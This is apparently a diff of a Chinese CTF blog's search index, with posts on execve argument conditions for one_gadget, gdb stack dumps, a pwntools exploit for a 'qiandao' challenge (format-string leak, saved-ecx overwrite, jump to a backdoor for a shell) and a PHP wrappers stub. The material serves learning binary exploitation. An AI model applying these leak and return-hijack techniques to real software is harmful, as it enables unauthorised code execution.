(&quot;asdadadas&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">0008| 0x7fffffffdf28 --&gt; 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">0016| 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x5555555547c6 --&gt; 0x1b01000068732e31 </span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdf58 --&gt; 0x6276ca1997ede900 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x000055555555470c	8	    execve(filename, argv, envp);</span><br></pre></td></tr></table></figure>
 
-<h4 id="对应的栈帧-1"><a href="#对应的栈帧-1" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- ebp+var_4</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+		</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx(stack)</span><br></pre></td></tr></table></figure>
+<p>观察到<code>rsi(0x7fffffffdf40)</code>处的值为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)  ; &lt;-- 合法指针</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x5555555547c6 --&gt; 0x1b01000068732e31 ; &lt;-- 合法指针</span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x0 ; &lt;-- NULL(合法指针)</span><br></pre></td></tr></table></figure>
 
-<h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p>main函数返回的时候，会先把<code>ebp-4</code>里面保存的<code>原ecx</code>寄存器的值还原，然后根据这个<code>ecx</code>的值，找到真正的<code>ret</code></p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>因为ROP需要劫持返回地址，那么在不知道原<code>ecx</code>值的情况下是无法真正劫持<code>ret</code>的，所以给了一个格式化字符串泄漏栈内的值，在泄漏了值之后就变得简单了</p>
-<h3 id="附上exp"><a href="#附上exp" class="headerlink" title="附上exp"></a>附上exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./qiandao&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;183.129.189.60&quot;, 10013)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x804857D</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">formats = <span class="string">&quot;%13$p&quot;</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;name:&quot;</span>, formats)</span><br><span class="line">sh.recvline()</span><br><span class="line">bp = <span class="built_in">int</span>(sh.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">cx = bp - <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">print(<span class="string">&quot;bp ==&gt; &quot;</span> + <span class="built_in">hex</span>(bp))</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&quot;b *0x080485FD&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = junk + p32(cx) + p32(backdoor) + p32(cx - <span class="number">8</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;problem&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>发现并不能getshell</p>
+<h2 id="one-gadget限制"><a href="#one-gadget限制" class="headerlink" title="one_gadget限制"></a>one_gadget限制</h2><p>使用<code>one_gadget</code>都有限制条件，例如<code>libc-2.27.so</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@shiroha:/mnt/hgfs/sharedPwn/vn_2020_simpleHeap$ one_gadget ../libc-2.27.so </span><br><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
 
-]]></content>
+<p>但是其实规则应该变成</p>
+<ol>
+<li> <code>[rsp+0x30(举例)] == NULL</code> </li>
+<li> <code>[rsp+0x30] == (pointer)</code> &amp;&amp; <code>[rsp+0x38] == NULL</code></li>
+</ol>
+<h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><p>师傅给的题是<code>vn_2020_simpleHeap</code></p>
+<p>exp最后<code>realloc</code>调整栈的时候调到<code>+0xC</code>的地方，发现不满足条件</p>
+<img src="one_gadget/image-20200720230640839.png" alt="image-20200720230640839" style="zoom:50%;" />
+
+<p>得到了shell：</p>
+<img src="one_gadget/image-20200720230708171.png" alt="image-20200720230708171" style="zoom:50%;" />]]></content>
       <categories>
         <category>pwn</category>
-        <category>ROP</category>
       </categories>
       <tags>
         <tag>pwn</tag>
-        <tag>ROP</tag>
       </tags>
   </entry>
   <entry>
@@ -2580,74 +2664,6 @@
       <tags>
         <tag>pwn</tag>
         <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>one_gadget条件的探寻</title>
-    <url>//one_gadget.html</url>
-    <content><![CDATA[<p>one_gadget的条件并没有那么苛刻，有很大的宽限余地</p>
-<p>感谢 <a href="https://blog.csdn.net/weixin_44864859">棂星</a> 师傅发现问题，感谢<a href="http://taqini.space/2020/04/29/about-execve/">TaQini师傅博客参考资料</a></p>
-<a id="more"></a>
-
-
-
-<h2 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h2><p>Linux下execve函数的描述</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], </span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>; </span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>  argv是要调用的程序执行的参数序列，也就是我们要调用的程序需要传入的参数。</p>
-</li>
-<li><p>  envp 同样也是参数序列，一般来说他是一种键值对的形式 key=value. 作为我们是新程序的环境。</p>
-</li>
-</ul>
-<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><h3 id="零个参数"><a href="#零个参数" class="headerlink" title="零个参数"></a>零个参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这显然可以。</p>
-<h3 id="一个参数"><a href="#一个参数" class="headerlink" title="一个参数"></a>一个参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">&quot;asdadadas&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果如下：</p>
-<p><img src="one_gadget/image-20200720225143097.png" alt="image-20200720225143097"></p>
-<p>得到了一个shell，观察此时的<code>argv[]</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDX: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDI: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBP: 0x7fffffffdf60 --&gt; 0x555555554730 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">RIP: 0x555555554701 (&lt;main+87&gt;:	call   0x555555554580 &lt;execve@plt&gt;)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x5555555545a0 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x5555555546f7 &lt;main+77&gt;:	mov    rax,QWORD PTR [rbp-0x38]</span><br><span class="line">   0x5555555546fb &lt;main+81&gt;:	mov    rsi,rcx</span><br><span class="line">   0x5555555546fe &lt;main+84&gt;:	mov    rdi,rax</span><br><span class="line">&#x3D;&gt; 0x555555554701 &lt;main+87&gt;:	call   0x555555554580 &lt;execve@plt&gt;</span><br><span class="line">   0x555555554706 &lt;main+92&gt;:	mov    eax,0x0</span><br><span class="line">   0x55555555470b &lt;main+97&gt;:	mov    rsi,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x55555555470f &lt;main+101&gt;:	xor    rsi,QWORD PTR fs:0x28</span><br><span class="line">   0x555555554718 &lt;main+110&gt;:	je     0x55555555471f &lt;main+117&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">arg[1]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">arg[2]: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">arg[3]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">0008| 0x7fffffffdf28 --&gt; 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">0016| 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">0056| 0x7fffffffdf58 --&gt; 0x219a7d923809200 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000555555554701	8	    execve(filename, argv, envp);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>观察到<code>rsi(0x7fffffffdf40)</code>处的值为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;) ; &lt;-- 合法指针</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x0 ; &lt;-- NULL(合法指针) </span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="两个参数"><a href="#两个参数" class="headerlink" title="两个参数"></a>两个参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">&quot;asdadadas&quot;</span>, <span class="string">&quot;1.sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>其中<code>1.sh</code>是我自己创建的一个文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@shiroha:/mnt/hgfs/sharedPwn/vn_2020_simpleHeap$ cat 1.sh </span><br><span class="line">echo hello</span><br></pre></td></tr></table></figure>
-
-<p>程序的运行结果如下</p>
-<p><img src="one_gadget/image-20200720224735113.png" alt="image-20200720224735113"></p>
-<p>成功运行了<code>1.sh</code>但是并没有返回一个shell，观察此时<code>argv[]</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDX: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDI: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBP: 0x7fffffffdf60 --&gt; 0x555555554730 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">RIP: 0x55555555470c (&lt;main+98&gt;:	call   0x555555554580 &lt;execve@plt&gt;)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x5555555545a0 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554702 &lt;main+88&gt;:	mov    rax,QWORD PTR [rbp-0x38]</span><br><span class="line">   0x555555554706 &lt;main+92&gt;:	mov    rsi,rcx</span><br><span class="line">   0x555555554709 &lt;main+95&gt;:	mov    rdi,rax</span><br><span class="line">&#x3D;&gt; 0x55555555470c &lt;main+98&gt;:	call   0x555555554580 &lt;execve@plt&gt;</span><br><span class="line">   0x555555554711 &lt;main+103&gt;:	mov    eax,0x0</span><br><span class="line">   0x555555554716 &lt;main+108&gt;:	mov    rsi,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x55555555471a &lt;main+112&gt;:	xor    rsi,QWORD PTR fs:0x28</span><br><span class="line">   0x555555554723 &lt;main+121&gt;:	je     0x55555555472a &lt;main+128&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">arg[1]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">arg[2]: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">arg[3]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">0008| 0x7fffffffdf28 --&gt; 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">0016| 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x5555555547c6 --&gt; 0x1b01000068732e31 </span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdf58 --&gt; 0x6276ca1997ede900 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x000055555555470c	8	    execve(filename, argv, envp);</span><br></pre></td></tr></table></figure>
-
-<p>观察到<code>rsi(0x7fffffffdf40)</code>处的值为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)  ; &lt;-- 合法指针</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x5555555547c6 --&gt; 0x1b01000068732e31 ; &lt;-- 合法指针</span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x0 ; &lt;-- NULL(合法指针)</span><br></pre></td></tr></table></figure>
-
-<p>发现并不能getshell</p>
-<h2 id="one-gadget限制"><a href="#one-gadget限制" class="headerlink" title="one_gadget限制"></a>one_gadget限制</h2><p>使用<code>one_gadget</code>都有限制条件，例如<code>libc-2.27.so</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@shiroha:/mnt/hgfs/sharedPwn/vn_2020_simpleHeap$ one_gadget ../libc-2.27.so </span><br><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
-
-<p>但是其实规则应该变成</p>
-<ol>
-<li> <code>[rsp+0x30(举例)] == NULL</code> </li>
-<li> <code>[rsp+0x30] == (pointer)</code> &amp;&amp; <code>[rsp+0x38] == NULL</code></li>
-</ol>
-<h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><p>师傅给的题是<code>vn_2020_simpleHeap</code></p>
-<p>exp最后<code>realloc</code>调整栈的时候调到<code>+0xC</code>的地方，发现不满足条件</p>
-<img src="one_gadget/image-20200720230640839.png" alt="image-20200720230640839" style="zoom:50%;" />
-
-<p>得到了shell：</p>
-<img src="one_gadget/image-20200720230708171.png" alt="image-20200720230708171" style="zoom:50%;" />]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -3146,6 +3162,23 @@
       </tags>
   </entry>
   <entry>
+    <title>php伪协议</title>
+    <url>//php_agreement.html</url>
+    <content><![CDATA[<p>（还没有开始写）</p>
+<p>参考资料: <a href="https://segmentfault.com/a/1190000018991087">php伪协议总结</a></p>
+<a id="more"></a>
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用nps</title>
     <url>//nps.html</url>
     <content><![CDATA[<p>使用<code>nps</code>工具进行内网渗透</p>
@@ -3294,23 +3327,6 @@
 <blockquote>
 <p>那么问题来了，如果构成了循环的嵌套包含会怎么样</p>
 </blockquote>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php伪协议</title>
-    <url>//php_agreement.html</url>
-    <content><![CDATA[<p>（还没有开始写）</p>
-<p>参考资料: <a href="https://segmentfault.com/a/1190000018991087">php伪协议总结</a></p>
-<a id="more"></a>
-
 ]]></content>
       <categories>
         <category>web</category>
